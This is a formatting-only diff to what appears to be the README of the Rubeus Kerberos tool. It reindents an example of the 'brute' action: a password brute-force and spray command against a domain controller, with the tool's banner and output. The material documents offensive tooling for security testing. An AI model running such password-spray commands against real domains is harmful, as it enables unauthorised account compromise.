@@ -1111,22 +1111,22 @@ The **brute** action will perform a Kerberos-based password bruteforcing or pass
 
 Using the `checkenctype`, `/validpassword` and `/validuser` arguments to check the Encrytion type before password spray.
 
-Rubeus.exe brute /password:xxx /noticket /domain:abc.def.com /checkenctype /validuser:xxx /validpassword:xxx
+    C:\Rubeus>Rubeus.exe brute /password:xxx /noticket /domain:abc.def.com /checkenctype /validuser:xxx /validpassword:xxx
 
-   ______        _
-  (_____ \      | |
-   _____) )_   _| |__  _____ _   _  ___
-  |  __  /| | | |  _ \| ___ | | | |/___)
-  | |  \ \| |_| | |_) ) ____| |_| |___ |
-  |_|   |_|____/|____/|_____)____/(___/
+    ______        _
+    (_____ \      | |
+    _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
 
-  v2.3.3
+    v2.3.3
 
 
-[*] Action: Perform Kerberos Brute Force
+    [*] Action: Perform Kerberos Brute Force
 
-[*] Using domain controller: abc.def.com
-[*] Trying encryption type: rc4_hmac
+    [*] Using domain controller: abc.def.com
+    [*] Trying encryption type: rc4_hmac
 
 
 
